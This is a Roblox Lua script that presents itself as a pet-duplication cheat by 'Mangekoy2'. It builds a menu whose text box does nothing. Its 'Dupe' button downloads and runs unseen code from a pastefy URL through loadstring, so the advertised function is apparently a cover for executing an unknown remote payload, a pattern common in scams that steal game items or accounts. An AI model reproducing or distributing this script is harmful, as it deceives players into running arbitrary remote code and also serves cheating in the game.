local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pet by Mangekoy2 | v2.0", "Serpent")

-- Вкладка Dupe Pet
local DupeTab = Window:NewTab("Dupe Pet")
local DupeSection = DupeTab:NewSection("Dupe Pet")
DupeSection:NewLabel("Credits: Made by Mangekoy2 | v2.0") -- Вторая строчка слева

-- Текстовое поле с подсказкой
local InputField = DupeSection:NewTextBox("", "Write any pet", function(text)
    -- Обработка введенного текста
end)
InputField.Instance.Size = UDim2.new(0, 250, 0, 30)

-- Надпись перед кнопкой
DupeSection:NewLabel("Dupe")

-- Кнопка Dupe
DupeSection:NewButton("Dupe", "", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)

-- Вкладка Credits
local CreditsTab = Window:NewTab("Credits")
CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
